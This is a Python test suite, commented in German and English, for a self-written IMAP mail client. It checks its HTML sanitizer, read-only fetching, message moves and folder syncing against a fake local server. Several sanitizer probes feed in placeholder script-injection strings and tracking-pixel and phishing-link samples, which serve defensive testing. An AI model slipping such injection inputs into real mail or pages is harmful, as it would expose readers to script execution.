probe("nur eine IP — erkannt", "ip" in arten)
probe("ein ehrlicher Verweis wird NICHT gemeldet",
      sum(1 for l in links if not l["warnung"]) == 1,
      "%d ohne Warnung" % sum(1 for l in links if not l["warnung"]))
r_zu = K.rahmen("<p>x</p>", False)
r_auf = K.rahmen("<p>x</p>", True)
probe("der Rahmen verbietet jedes Skript", "script-src 'none'" in r_zu)
probe("ohne Erlaubnis nennt img-src kein http", " http:" not in r_zu.split("img-src")[1][:60])
probe("mit Erlaubnis nennt img-src http", " http:" in r_auf.split("img-src")[1][:60])
probe("Text wird zu Absaetzen mit Zitat",
      'class="pw-zitat"' in K.text_zu_html("a\n> zitiert\n"))
probe("eine nackte Adresse im Text wird anklickbar",
      'href="mailto:' in K.text_zu_html("schreib an post@erfunden.example"))
probe("ein Verweis im Text traegt noopener",
      "noopener" in K.text_zu_html("sieh https://erfunden.example"))

# 🔴 The one that cost der Besitzer every HTML mail (5.0.1). A void element has no end
# tag — so it must never open a region that waits for one. `<meta>` stood in the
# silent list and NOT in the void list, and with that the counter went to 1 at
# the top of nearly every newsletter and never came back: everything after it
# was dropped, only the style block survived. The reading pane was empty and the
# mail was complete. Every one of these probes FAILS against the old code.
ECHTER_KOPF = (
    '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"\n'
    ' "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\n'
    '<html xmlns="http://www.w3.org/1999/xhtml"><head>\n'
    '<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />\n'
    '<meta name="viewport" content="width=device-width" />\n'
    '<title>Nicht der Brief</title>\n'
    '<style>.k{color:#333}</style></head><body>\n'
    '<table><tr><td class="k">Der Brief steht hier.</td></tr></table>\n'
    '<img src="cid:logo1" /><p>Und hier noch etwas.</p></body></html>')
sauber, _, _ = K.html_saeubern(ECHTER_KOPF, False, [], "INBOX", 1)
probe("eine Mail mit echtem Kopf zeigt ihren Text",
      "Der Brief steht hier." in sauber and "Und hier noch etwas." in sauber,
      "%d Zeichen" % len(sauber))
probe("und ihren Stilblock behaelt sie trotzdem", ".k{color:#333}" in sauber)
probe("der Titel gehoert NICHT zum Brief", "Nicht der Brief" not in sauber)
for name, roh in (
        ("ein einzelnes <meta/>", '<meta charset="utf-8" /><p>danach</p>'),
        ("ein <link>", '<link rel="stylesheet" href="https://x.example/a.css"><p>danach</p>'),
        ("ein <base>", '<base href="https://x.example/"><p>danach</p>'),
        ("ein nie geschlossenes <input>", '<input name="pw"><p>danach</p>'),
        ("ein selbstschliessendes <div/>", '<div/><p>danach</p>'),
        ("ein <source> ohne Ende", '<source src="a.mp3"><p>danach</p>'),
        ("ein Formular um den Brief", '<form action="x"><p>danach</p></form>')):
    sauber, _, _ = K.html_saeubern(roh, False, [], "INBOX", 1)
    probe("bringt den Rest des Briefes nicht zum Schweigen: %s" % name,
          "danach" in sauber, repr(sauber[:60]))
sauber, _, _ = K.html_saeubern('<script>boese()</script><p>danach</p>', False,
                               [], "INBOX", 1)
probe("ein Skript schweigt weiterhin — mit seinem Inhalt",
      "boese" not in sauber and "danach" in sauber, repr(sauber[:60]))
sauber, _, _ = K.html_saeubern('<script>a<p>b</p>', False, [], "INBOX", 1)
probe("ein Skript OHNE Ende nimmt den Rest mit (und nichts davon kommt durch)",
      "a" not in sauber and "<p>" not in sauber, repr(sauber[:60]))
sauber, _, _ = K.html_saeubern('</iframe><script>heimlich</script><p>da</p>',
                               False, [], "INBOX", 1)
probe("ein herrenloses </iframe> hebt keine Stille auf, die es nie gab",
      "heimlich" not in sauber and "da" in sauber, repr(sauber[:60]))
# 🔴 And the wall behind the rule: if the filter ever hands back a page with
# nothing on it, the letter is shown as TEXT instead of not at all.
leer, _, _ = K.html_saeubern("<title>nur der Titel</title>", False, [], "INBOX", 1)
probe("was nichts Sichtbares ergibt, wird nicht als HTML gezeigt", leer == "",
      repr(leer[:60]))
voll, _, _ = K.html_saeubern("<p>ein Wort</p>", False, [], "INBOX", 1)
probe("was etwas ergibt, wird gezeigt", "ein Wort" in voll)
nur_bild, _, _ = K.html_saeubern('<img src="cid:logo1">', False,
                                 [{"id": "logo1", "nr": "3", "k": "BASE64"}], "INBOX", 1)
probe("ein Brief, der NUR ein Bild ist, gilt als sichtbar", "<img" in nur_bild)

# ── The excerpt for the list: cut pieces, and both encodings survive it ──
probe("ein abgeschnittenes Quoted-Printable verliert nur das halbe Zeichen",
      K._auszug_aus("Gr=C3=BC=C3".encode(), "QUOTED-PRINTABLE", "utf-8", False)
      .startswith("Gr\u00fc"),
      repr(K._auszug_aus("Gr=C3=BC=C3".encode(), "QUOTED-PRINTABLE", "utf-8", False)))
roh64 = __import__("base64").b64encode("Ein laengerer Brief zum Abschneiden".encode())
probe("ein abgeschnittenes Base64 ergibt trotzdem Text",
      "Ein laenger" in K._auszug_aus(roh64[:23], "BASE64", "utf-8", False),
      repr(K._auszug_aus(roh64[:23], "BASE64", "utf-8", False)))
probe("aus HTML wird fuer die Liste reiner Text",
      K._auszug_aus(b"<style>a{}</style><p>Hallo <b>du</b></p>", "", "utf-8", True)
      == "Hallo du",
      repr(K._auszug_aus(b"<style>a{}</style><p>Hallo <b>du</b></p>", "", "utf-8", True)))
probe("zitierte Zeilen und die Signatur stehen nicht in der Liste",
      K._auszug_aus(b"> altes Zitat\nNeuer Satz.\n--\nGruss", "", "utf-8", False)
      == "Neuer Satz. Gruss",
      repr(K._auszug_aus(b"> altes Zitat\nNeuer Satz.\n--\nGruss", "", "utf-8", False)))
probe("ein Auszug bleibt kurz",
      len(K._auszug_aus(("Wort " * 400).encode(), "", "utf-8", False)) <= K.AUSZUG_ZEICHEN)


# ══ 4. What really goes over the wire ═════════════════════════════════════
print("\n── 4. Die Befehle am falschen Server ──")
server, kasten = mit_falschem_server(faehig=("SORT", "MOVE"))
# From here on the mailbox exists as far as the client is concerned — same file,
# same 0600 as in real operation.
K.W.save("postfaecher.json", {"liste": [{
    "id": "probe", "name": "Probe", "adresse": "inhaber@erfunden.example",
    "passwort": "geheim", "server": "127.0.0.1", "port": server.port, "an": True}]},
    0o600)
K._VERBINDUNGEN.clear()

baum = kasten.baum()
nach_rolle = {o["rolle"]: o for o in baum if o["rolle"]}
probe("der Baum kennt alle Ordner", len(baum) == len(ORDNER), "%d" % len(baum))
probe("Sonderordner an der FLAGGE erkannt",
      set(nach_rolle) >= {"posteingang", "gesendet", "papierkorb", "entwuerfe"},
      ", ".join(sorted(nach_rolle)))
umlaut = next((o for o in baum if "Gel" in o["zeige"]), None)
probe("ein Ordnername mit Umlaut wird lesbar angezeigt",
      bool(umlaut) and umlaut["zeige"] == "Gelöschtes",
      umlaut["zeige"] if umlaut else "—")
probe("der ROHE Name bleibt, wie der Server ihn nennt",
      bool(umlaut) and umlaut["name"] == "INBOX.Gel&APY-schtes")
nicht_waehlbar = [o for o in baum if not o["waehlbar"]]
probe("ein \\Noselect-Ordner ist nicht waehlbar", len(nicht_waehlbar) == 1)
probe("ein nicht waehlbarer Ordner wird nicht gezaehlt",
      not any("INBOX.Technik\"" in b for b in server.befehle if b.split(" ")[1:2] == ["STATUS"]))
probe("die Tiefe stimmt", next(o["tiefe"] for o in baum
                              if o["name"] == "INBOX.Technik.Synology") == 2)

uids, sortiert = kasten.uids("INBOX")
probe("mit SORT sortiert der Server", sortiert and uids == [103, 102, 101], str(uids))
probe("SORT wird auch benutzt", any(" UID SORT " in b for b in server.befehle))
uids_u, _ = kasten.uids("INBOX", sieb="ungelesen")
probe("das Sieb „ungelesen“ fragt UNSEEN und bekommt nur die eine",
      uids_u == [101] and any("UNSEEN" in b for b in server.befehle), str(uids_u))
koepfe = kasten.koepfe([101, 102, 103])
probe("alle drei Kopfsaetze kommen an", len(koepfe) == 3, str(sorted(koepfe)))
k102 = koepfe.get(102, {})
probe("ein RFC-2047-Betreff wird lesbar",
      k102.get("betreff") == "Rechnung für September", repr(k102.get("betreff")))
probe("ein kodierter Anzeigename wird lesbar",
      k102.get("von") == "Grüße", repr(k102.get("von")))
probe("die Flaggen stimmen",
      koepfe[101]["gelesen"] is False and k102["markiert"] is True
      and koepfe[103]["beantwortet"] is True)
probe("das Datum wird gelesen", k102.get("zeit", "").startswith("2026-09-26"),
      k102.get("zeit"))
probe("der Abmeldeweg wird gesehen", k102.get("abmelden") is True)
k103 = koepfe.get(103, {})
probe("ein ROHER Acht-Bit-Betreff wird lesbar",
      k103.get("betreff") == "Bescheid über Gebühren", repr(k103.get("betreff")))
probe("und ein roher Acht-Bit-Absendername auch",
      k103.get("von") == "Amt Sandström", repr(k103.get("von")))
probe("der Gesprächsfaden zeigt auf die erste Mail",
      koepfe[103]["strang"] == "eins@erfunden.example", koepfe[103]["strang"])
probe("das Logo zaehlt NICHT als Anhang, die Rechnung schon",
      k102.get("anhang") == 1, "%s Anhang/Anhaenge" % k102.get("anhang"))

# ── The excerpt in the list: what it costs, and what it does NOT do ──────
vor = len(server.befehle)
mit = kasten.koepfe([101, 102, 103], auszug=True)
neue = [b for b in server.befehle[vor:] if "BODY.PEEK[" in b and "HEADER" not in b]
probe("die Liste zeigt den Anfang des Briefes",
      mit.get(101, {}).get("auszug", "").startswith("Hallo der Besitzer"),
      repr(mit.get(101, {}).get("auszug")))
probe("auch wenn der Brief in windows-1252 geschrieben ist",
      "49,90 €" in mit.get(102, {}).get("auszug", ""),
      repr(mit.get(102, {}).get("auszug")))
probe("der Auszug wird nur STUECKWEISE geholt, nie ganz",
      neue and all(re.search(r"<0\.\d+>", b) for b in neue),
      "; ".join(b[-40:] for b in neue[:2]))
probe("und er kostet EINEN Abruf je Bauform, nicht einen je Mail",
      len(neue) <= 3, "%d Abruf(e) fuer 3 Mails" % len(neue))
probe("auch der Auszug fasst nichts an: kein Abruf ohne PEEK",
      not [b for b in server.befehle[vor:] if re.search(r"\bBODY\[", b)])
probe("und er setzt keine Flagge",
      not [b for b in server.befehle[vor:] if " STORE " in b])
ohne = kasten.koepfe([101], auszug=False)
probe("ohne Einstellung wird gar nichts nachgeholt",
      "auszug" not in ohne.get(101, {}))

mail = kasten.mail("INBOX", 102)
probe("der Textteil wird mit SEINEM Zeichensatz gelesen",
      "49,90 €" in mail.get("text", ""), repr(mail.get("text", "")[-24:]))
probe("es gibt einen HTML-Teil und einen Textteil",
      mail.get("hat_html") and mail.get("hat_text"))
probe("im gesaeuberten HTML steht kein Skript", "script" not in mail.get("html", "").lower())
probe("das Zaehlpixel ist geblockt", mail.get("fern_blockiert", 0) >= 1)
probe("der falsche Bank-Verweis ist gemeldet",
      any(l["warnung"] == "text" for l in mail.get("links_verdacht", [])))
probe("der Anhang traegt den langen Namen aus der Verfuegung",
      [a["n"] for a in mail.get("anhaenge", [])] == ["Rechnung September.pdf"],
      str([a["n"] for a in mail.get("anhaenge", [])]))
probe("alle Kopfzeilen stehen zum Aufklappen bereit",
      len(mail.get("kopfzeilen", [])) >= 6)

# ── „Alles Neue": one list out of every folder that has something ───────
# 🔑 The view the watchman makes necessary — it carries new post into folders, so
# „what came in" is no longer one folder. The probes ask what it really touches.
server.befehle.clear()
n = kasten.neue("ungelesen", mit_spam=False)
orte = {m["ordner"] for m in n["mails"]}
besehen = [b.split(" ", 2)[2].strip().strip('"')
           for b in server.befehle if " EXAMINE " in b or " SELECT " in b]
probe("die Neu-Ansicht sammelt aus MEHREREN Ordnern", len(orte) >= 3,
      ", ".join(sorted(orte)))
probe("jede Zeile weiss, in welchem Ordner sie liegt",
      all(m.get("ordner") and m.get("ordner_kurz") for m in n["mails"]))
probe("der Papierkorb bleibt draussen",
      "INBOX.Papierkorb" not in orte and not any("Papierkorb" in b for b in besehen),
      ", ".join(besehen))
probe("die Entwuerfe bleiben draussen", "INBOX.Entwuerfe" not in orte)
probe("die Werbung bleibt draussen, solange sie nicht erlaubt ist",
      "INBOX.Werbung" not in orte)
probe("ein \\Noselect-Ordner wird gar nicht erst geoeffnet",
      not any(b.endswith('INBOX.Technik"') for b in besehen), ", ".join(besehen))
probe("sortiert ist nach DATUM, ueber alle Ordner hinweg",
      [m["zeit"] for m in n["mails"]] == sorted((m["zeit"] for m in n["mails"]),
                                                reverse=True))
probe("auch hier: kein Abruf ohne PEEK",
      not [b for b in server.befehle if re.search(r"\bBODY\[", b)])
probe("nur besehen, nie zum Schreiben geoeffnet",
      not any(" SELECT " in b for b in server.befehle),
      "; ".join(b for b in server.befehle if " SELECT " in b)[:80])
probe("und keine einzige Flagge gesetzt",
      not any(" STORE " in b for b in server.befehle))
mit = kasten.neue("ungelesen", mit_spam=True)
probe("mit Erlaubnis ist die Werbung dabei",
      "INBOX.Werbung" in {m["ordner"] for m in mit["mails"]})
# 🔴 One folder of newsletters must not eat the whole budget. Synology answers
# with 25, every other folder with one — with a limit of 6 the others still have
# to appear.
klein = kasten.neue("ungelesen", mit_spam=False, grenze=6)
probe("eine Grenze kuerzt und sagt es", len(klein["mails"]) <= 6 and klein["gekuerzt"],
      "%d Zeilen, gekuerzt=%s" % (len(klein["mails"]), klein["gekuerzt"]))
probe("ein voller Ordner frisst die anderen nicht auf",
      len({m["ordner"] for m in klein["mails"]}) >= 2,
      ", ".join(sorted({m["ordner"] for m in klein["mails"]})))
probe("die Gesamtzahl bleibt ehrlich", klein["gesamt"] == n["gesamt"],
      "%s statt %s" % (klein["gesamt"], n["gesamt"]))
server.befehle.clear()
zeit = kasten.neue("t3", mit_spam=False)
probe("ein Zeitraum fragt SINCE statt UNSEEN",
      any("SINCE" in b for b in server.befehle)
      and not any("UNSEEN" in b for b in server.befehle))
probe("und er sieht in JEDEN erlaubten Ordner",
      len({m["ordner"] for m in zeit["mails"]}) >= len(orte))

# 🔴 THE central check: nothing is ever fetched without PEEK.
nackt = [b for b in server.befehle if re.search(r"\bBODY\[", b)]
probe("KEIN einziger Abruf ohne BODY.PEEK", not nackt, "; ".join(nackt[:2]))
probe("es wurde ueberhaupt mit PEEK geholt",
      sum(1 for b in server.befehle if "BODY.PEEK[" in b) >= 3)
# Browsing opens the folder READ-ONLY (EXAMINE), only an action opens it SELECT.
vorher_select = sum(1 for b in server.befehle if " SELECT " in b)
probe("beim Blaettern wird der Ordner nur besehen (EXAMINE)",
      any(" EXAMINE " in b for b in server.befehle))
kasten.flagge("INBOX", [101], "\\Seen", True)
probe("erst die Tat oeffnet den Ordner zum Schreiben (SELECT)",
      sum(1 for b in server.befehle if " SELECT " in b) > vorher_select)
probe("die Flagge wird als +FLAGS gesetzt",
      any("+FLAGS" in b and "Seen" in b for b in server.befehle))
kasten.flagge("INBOX", [101], "\\Seen", False)
probe("und als -FLAGS wieder genommen",
      any("-FLAGS" in b and "Seen" in b for b in server.befehle))

# Moving — with MOVE, and without.
server.befehle.clear()
erg = kasten.verschieben_viele("INBOX", [101], "INBOX.Technik.Synology")
probe("mit MOVE wird MOVE benutzt",
      erg["ok"] and any(" UID MOVE " in b for b in server.befehle))
probe("mit MOVE wird NICHTS als geloescht markiert",
      not any("Deleted" in b for b in server.befehle))
probe("mit MOVE wird nicht aufgeraeumt (kein EXPUNGE)",
      not any(b.endswith("EXPUNGE") for b in server.befehle))

server2, kasten2 = mit_falschem_server(faehig=())        # a server without MOVE
erg = kasten2.verschieben_viele("INBOX", [101, 102], "INBOX.Papierkorb")
folge = [b.split(" ", 1)[1] for b in server2.befehle if " UID " in b or b.endswith("EXPUNGE")]
kopie_vor_deleted = (any("COPY" in f for f in folge) and
                     any("Deleted" in f for f in folge) and
                     [i for i, f in enumerate(folge) if "COPY" in f][0] <
                     [i for i, f in enumerate(folge) if "Deleted" in f][0])
probe("ohne MOVE: kopieren, abhaken, aufraeumen", erg["ok"] and kopie_vor_deleted,
      " → ".join(f.split("(")[0][:22] for f in folge))
probe("das EXPUNGE kommt ZULETZT",
      folge and folge[-1].endswith("EXPUNGE"), folge[-1] if folge else "—")

# 🔴 THE counter-test: a copy that fails must leave the mail untouched.
server3, kasten3 = mit_falschem_server(faehig=(), kopie_geht=False)
erg = kasten3.verschieben_viele("INBOX", [101], "INBOX.Papierkorb")
probe("schlaegt die Kopie fehl, meldet es das", erg["ok"] is False)
probe("schlaegt die Kopie fehl, wird NICHTS als geloescht markiert",
      not any("Deleted" in b for b in server3.befehle),
      "; ".join(b for b in server3.befehle if "Deleted" in b))
probe("schlaegt die Kopie fehl, wird NICHT aufgeraeumt",
      not any(b.endswith("EXPUNGE") for b in server3.befehle))

# Without SORT there is only the UID order — and it has to say so.
uids4, sortiert4 = kasten2.uids("INBOX", sortierung="betreff")
probe("ohne SORT wird nach UID geblaettert und das zugegeben",
      uids4 == [103, 102, 101] and sortiert4 is False)
probe("ohne SORT wird kein SORT gesendet",
      not any(" UID SORT " in b for b in server2.befehle))


# ══ 5. Reading and writing through the real functions ═════════════════════
print("\n── 5. Lesen und Schreiben ueber die echten Wege ──")
erg = K.liste({"pf": "probe", "ordner": "INBOX"})
probe("die Liste liefert alle drei", erg["ok"] and len(erg["mails"]) == 3,
      "%d von %d" % (len(erg["mails"]), erg["gesamt"]))
probe("die Reihenfolge des Servers bleibt",
      [m["uid"] for m in erg["mails"]] == [103, 102, 101],
      str([m["uid"] for m in erg["mails"]]))
VIELE = "INBOX.Technik.Synology"
seite2 = K.liste({"pf": "probe", "ordner": VIELE, "pro_seite": 10, "seite": 2})
probe("geblaettert wird auf der UID-Liste, nicht an den Mails",
      seite2["gesamt"] == 25 and seite2["seiten"] == 3 and len(seite2["mails"]) == 10,
      "Seite %d/%d mit %d Mails" % (seite2["seite"], seite2["seiten"],
                                    len(seite2["mails"])))
probe("die zweite Seite zeigt die zweite Zehn",
      [m["uid"] for m in seite2["mails"]] == list(range(115, 105, -1)),
      str([m["uid"] for m in seite2["mails"]][:3]) + " …")
probe("eine zu kleine Seitengroesse wird auf das Mindestmass gehoben",
      K.liste({"pf": "probe", "ordner": VIELE, "pro_seite": 2})["pro_seite"] == 10)
weit = K.liste({"pf": "probe", "ordner": VIELE, "pro_seite": 10, "seite": 99})
probe("eine Seite hinter dem Ende faellt auf die letzte zurueck", weit["seite"] == 3,
      str(weit["seite"]))

K.einstellung_setzen({"gelesen_nach": -1, "bilder": "nie", "html_zuerst": True})
server.befehle.clear()
gezeigt = K.mail_zeigen({"pf": "probe", "ordner": "INBOX", "uid": 102})
probe("die Mail kommt mit fertigem Rahmen",
      gezeigt.get("ok") and "script-src 'none'" in gezeigt.get("rahmen", ""))
probe("HTML zuerst, weil so eingestellt", gezeigt.get("ansicht") == "html")
probe("„nur von Hand“ heisst: KEINE Gelesen-Marke",
      not any("Seen" in b for b in server.befehle),
      "; ".join(b for b in server.befehle if "Seen" in b)[:60])
K.einstellung_setzen({"gelesen_nach": 0})
server.befehle.clear()
K.mail_zeigen({"pf": "probe", "ordner": "INBOX", "uid": 101})
probe("„sofort“ setzt die Gelesen-Marke — und nur dann",
      any("+FLAGS" in b and "Seen" in b for b in server.befehle))
K.einstellung_setzen({"gelesen_nach": -1})
als_text = K.mail_zeigen({"pf": "probe", "ordner": "INBOX", "uid": 102,
                          "ansicht": "text"})
probe("auf Wunsch der Textteil", als_text.get("ansicht") == "text"
      and "49,90" in als_text.get("rahmen", ""))
mit_bild = K.mail_zeigen({"pf": "probe", "ordner": "INBOX", "uid": 102, "bilder": 1})
probe("auf Wunsch mit Bildern", mit_bild.get("bilder") is True
      and "tracker.erfunden.example" in mit_bild.get("rahmen", ""))

# Deleting: into the bin — and only on demand for good.
server.befehle.clear()
K.einstellung_setzen({"papierkorb": "ordner"})
erg = K.loeschen({"pf": "probe", "ordner": "INBOX", "uids": [101]})
probe("Loeschen heisst in den Papierkorb", erg.get("ok")
      and any("Papierkorb" in b for b in server.befehle))
probe("dabei wird nichts endgueltig entfernt",
      not any(b.endswith("EXPUNGE") for b in server.befehle))
server.befehle.clear()
erg = K.loeschen({"pf": "probe", "ordner": "INBOX", "uids": [101],
                  "endgueltig": True})
probe("endgueltig loeschen markiert und raeumt auf",
      any("Deleted" in b for b in server.befehle)
      and any(b.endswith("EXPUNGE") for b in server.befehle))
server.befehle.clear()
erg = K.loeschen({"pf": "probe", "ordner": "INBOX.Papierkorb", "uids": [101]})
probe("im Papierkorb loescht Loeschen endgueltig",
      any("Deleted" in b for b in server.befehle))

# The form for reply, reply-to-all and forward.
v = K.vorlage({"pf": "probe", "art": "antwort", "ordner": "INBOX", "uid": 102})
probe("die Antwort geht an den Absender", v["an"] == "shop@erfunden.example", v["an"])
probe("der Betreff bekommt genau EIN Re:", v["betreff"] == "Re: Rechnung für September",
      v["betreff"])
probe("der Text ist zitiert", "> Sehr geehrter Kunde," in v["text"])
kopfzeile = next((z for z in v["text"].splitlines() if z.startswith("Am ")), "")
probe("die Zitatzeile nennt Datum und Absender",
      "26.09.2026" in kopfzeile and "Grüße" in kopfzeile, kopfzeile)
va = K.vorlage({"pf": "probe", "art": "antwort_alle", "ordner": "INBOX", "uid": 102})
probe("allen antworten nimmt die anderen Empfaenger mit",
      "zweiter@erfunden.example" in va["kopie"] and "dritter@erfunden.example" in va["kopie"],
      va["kopie"])
probe("meine EIGENE Adresse steht nicht in der Kopie",
      "inhaber@erfunden.example" not in va["kopie"], va["kopie"])
vw = K.vorlage({"pf": "probe", "art": "weiter", "ordner": "INBOX", "uid": 102})
probe("weiterleiten setzt Wg: und keinen Empfaenger",
      vw["betreff"].startswith("Wg:") and not vw["an"], vw["betreff"])
probe("weiterleiten bietet den Anhang an", len(vw["anhaenge"]) == 1)
probe("ein zweites Re: kommt nicht dazu",
      K.vorlage({"pf": "probe", "art": "antwort", "ordner": "INBOX",
                 "uid": 103})["betreff"] == "Re: Bescheid über Gebühren")

K.W.save("absender.json", {"anna@erfunden.example": {"n": 12, "name": "Anna Beispiel"},
                           "shop@erfunden.example": {"n": 3, "name": "Grüße"}})
buch = K.adressbuch({"pf": "probe", "q": "anna"})
probe("das Adressbuch kommt aus dem Gedaechtnis des Waechters",
      len(buch["treffer"]) == 1 and buch["treffer"][0]["n"] == 12)
probe("es sortiert nach Haeufigkeit",
      [t["adresse"] for t in K.adressbuch({"pf": "probe", "q": "erfunden"})["treffer"]]
      == ["anna@erfunden.example", "shop@erfunden.example"])


# ══ 5d. A whole folder moves house ════════════════════════════════════════
print("\n── 5d. Ein ganzer Ordner zieht um ──")
server6, kasten6 = mit_falschem_server(faehig=("MOVE",))
K.W.save("postfaecher.json", {"liste": [
    {"id": "probe", "name": "Probe", "adresse": "inhaber@erfunden.example",
     "passwort": "geheim", "server": "127.0.0.1", "port": server.port, "an": True},
    {"id": "zug", "name": "Zug", "adresse": "inhaber@erfunden.example",
     "passwort": "geheim", "server": "127.0.0.1", "port": server6.port, "an": True}]},
    0o600)
K._VERBINDUNGEN.clear()

# What the watchman has LEARNED about the folder that is about to move.
K.W.pf_waehlen("zug")
K.W.save("ablage.json", {
    "absender": {"anna@erfunden.example": {"ordner": "INBOX.Technik.Synology",
                                           "treffer": 9, "gesamt": 9}},
    "domain": {"erfunden.example": {"ordner": "INBOX.Gesendet", "treffer": 4,
                                    "gesamt": 4}},
    "haupt": {}, "v_absender": {}, "v_domain": {}, "v_haupt": {},
    "ordner": {"INBOX.Technik.Synology": 41, "INBOX.Gel&APY-schtes": 3},
    "namen": {"synology": "INBOX.Technik.Synology"},
    "schwaechen": {"fast_leere_ordner": ["INBOX.Technik.Synology"],
                   "leere_ordner": []}})
K.W.save("anhaenge.json", {"eintraege": {
    "m123": {"ordner": "INBOX.Technik.Synology", "uid": 88, "datum": "2026-09-01",
             "dateien": [], "ds": []}},
    "stand": {"INBOX.Technik.Synology": {"fertig": True}}})
K.W.save("koepfe.json", [{"betreff": "x", "klasse": "automatisch",
                          "verschoben_nach": "INBOX.Technik.Synology"}])
import os as _os2
_os2.makedirs(K.W.OUT, exist_ok=True)
with io.open(_os2.path.join(K.W.OUT, "journal.jsonl"), "w", encoding="utf-8") as _fh:
    _fh.write(json.dumps({"zeit": "2026-09-27T10:00:00", "uid": 88, "von": "INBOX",
                          "nach": "INBOX.Technik.Synology",
                          "anzeige": "INBOX.Technik.Synology", "klasse": "automatisch",
                          "betreff": "x", "absender": "anna@erfunden.example",
                          "zurueck": False}, ensure_ascii=False) + "\n")
K.einstellung_setzen({"ordner_archiv": "INBOX.Technik.Synology"})

# 🔴 A special folder is a POSITION. Every mail program looks for Sent where it
# is, and the watchman files against it.
fest = K.ordner_ziehen({"pf": "zug", "ordner": "INBOX.Gesendet", "ziel": ""})
probe("ein Sonderordner zieht nicht um", fest["ok"] is False, fest.get("text", "")[:40])
in_sich = K.ordner_ziehen({"pf": "zug", "ordner": "INBOX.Technik",
                           "ziel": "INBOX.Technik.Synology"})
probe("ein Ordner zieht nicht in sein eigenes Kind", in_sich["ok"] is False)
weg_da = K.ordner_ziehen({"pf": "zug", "ordner": "INBOX.Gibtesnicht", "ziel": ""})
probe("ein Ordner, den es nicht gibt, zieht auch nicht um", weg_da["ok"] is False)

server6.befehle.clear()
erg = K.ordner_ziehen({"pf": "zug", "ordner": "INBOX.Technik.Synology",
                       "ziel": "INBOX.Gel&APY-schtes"})
probe("der Umzug geht durch", erg["ok"] is True, erg.get("text", "")[:60])
probe("er benutzt RENAME — nicht kopieren und loeschen",
      any(" RENAME " in b for b in server6.befehle)
      and not any("COPY" in b or "APPEND" in b for b in server6.befehle),
      "; ".join(b.split(" ", 1)[1][:34] for b in server6.befehle[:4]))
probe("der neue Platz steht in der Antwort",
      erg["neu"] == "INBOX.Gel&APY-schtes.Synology", erg.get("neu"))
probe("das Abonnement wird erneuert",
      any("UNSUBSCRIBE" in b for b in server6.befehle)
      and any(b.endswith('SUBSCRIBE "INBOX.Gel&APY-schtes.Synology"')
              for b in server6.befehle))
# 🔑 And now the half that matters: does the watchman still know where it is?
K.W.pf_waehlen("zug")
karte = K.W.load("ablage.json", {})
probe("die gelernte Ablage zeigt auf den neuen Platz",
      karte["absender"]["anna@erfunden.example"]["ordner"]
      == "INBOX.Gel&APY-schtes.Synology",
      karte["absender"]["anna@erfunden.example"]["ordner"])
probe("die Ordnerzahlen der Ablage sind mitgezogen",
      "INBOX.Gel&APY-schtes.Synology" in karte["ordner"]
      and "INBOX.Technik.Synology" not in karte["ordner"])
probe("die Namensbruecke zeigt auf den neuen Platz",
      karte["namen"]["synology"] == "INBOX.Gel&APY-schtes.Synology")
probe("ein Ordner, der NICHT umgezogen ist, bleibt unberuehrt",
      karte["domain"]["erfunden.example"]["ordner"] == "INBOX.Gesendet")
idx = K.W.load("anhaenge.json", {})
probe("der Anhang-Index zeigt auf den neuen Platz",
      idx["eintraege"]["m123"]["ordner"] == "INBOX.Gel&APY-schtes.Synology"
      and "INBOX.Gel&APY-schtes.Synology" in idx["stand"])
koepfe = K.W.load("koepfe.json", [])
probe("was der Waechter sich gemerkt hat, nennt den neuen Platz",
      koepfe[0]["verschoben_nach"] == "INBOX.Gel&APY-schtes.Synology")
zeilen = [json.loads(z) for z in io.open(
    _os2.path.join(K.W.OUT, "journal.jsonl"), encoding="utf-8").read().splitlines() if z]
probe("der Weg zurueck im Journal zeigt auf den neuen Platz",
      zeilen[0]["nach"] == "INBOX.Gel&APY-schtes.Synology"
      and zeilen[0]["von"] == "INBOX", str(zeilen[0]["nach"]))
probe("ein von Hand gesetzter Ordner in den Einstellungen zieht mit",
      K.einstellungen()["ordner_archiv"] == "INBOX.Gel&APY-schtes.Synology",
      K.einstellungen()["ordner_archiv"])
belegt = K.ordner_ziehen({"pf": "zug", "ordner": "INBOX.Gel&APY-schtes.Synology",
                          "ziel": "INBOX.Gel&APY-schtes"})
probe("an denselben Platz noch einmal geht nicht", belegt["ok"] is False,
      belegt.get("text", "")[:40])
# ── Created and deleted, and what the watchman learns from it ─────────────
# der Besitzer, 28.09.2026: „und wenn man von hand ordner löscht oder neu anlegt muss
# die postwache das auch lernen!!" (his words stay his words)
K.W.pf_waehlen("zug")
K.W.save("ablage.json", {
    "absender": {"anna@erfunden.example": {"ordner": "INBOX.Gel&APY-schtes.Synology",
                                           "treffer": 9, "gesamt": 9},
                 "bea@erfunden.example": {"ordner": "INBOX.Gesendet",
                                          "treffer": 4, "gesamt": 4}},
    "domain": {}, "haupt": {}, "v_absender": {}, "v_domain": {}, "v_haupt": {},
    "ordner": {"INBOX.Gel&APY-schtes.Synology": 41, "INBOX.Gesendet": 12},
    "namen": {"synology": "INBOX.Gel&APY-schtes.Synology"},
    "schwaechen": {"fast_leere_ordner": [], "leere_ordner": []},
    "gelernt": "2026-09-28T12:00:00"})

erg = K.ordner_neu({"pf": "zug", "name": "Steuer"})
probe("ein neuer Ordner wird angelegt", erg["ok"] is True, erg.get("text"))
karte = K.W.load("ablage.json", {})
probe("die Wache kennt den neuen Ordner SOFORT",
      "INBOX.Steuer" in (karte.get("ordner") or {}),
      ", ".join(sorted(karte.get("ordner") or {})[:4]))
probe("er zaehlt null Mails — und ist trotzdem ein Ziel",
      (karte.get("ordner") or {}).get("INBOX.Steuer") == 0)
# 🔑 That is the whole point: the name bridge hangs only on the NAME, so an
#    empty folder „Steuer" can take post from `steuer@…` from its first second.
probe("die Namensbruecke nimmt ihn auf",
      (karte.get("namen") or {}).get("steuer") == "INBOX.Steuer",
      str((karte.get("namen") or {}).get("steuer")))

# 🔴 Now the other direction: a folder disappears — here by a foreign hand,
#    exactly as it happens when it is deleted in another mail program.
server6.ordner = [(f, n) for f, n in server6.ordner
                  if n != "INBOX.Gel&APY-schtes.Synology"]
bericht = K._wache_abgleichen("zug")
karte = K.W.load("ablage.json", {})
probe("ein fremd geloeschter Ordner faellt aus der Ablage",
      "INBOX.Gel&APY-schtes.Synology" not in (karte.get("ordner") or {}),
      "fort %s, neu %s" % (bericht.get("fort"), bericht.get("neu")))
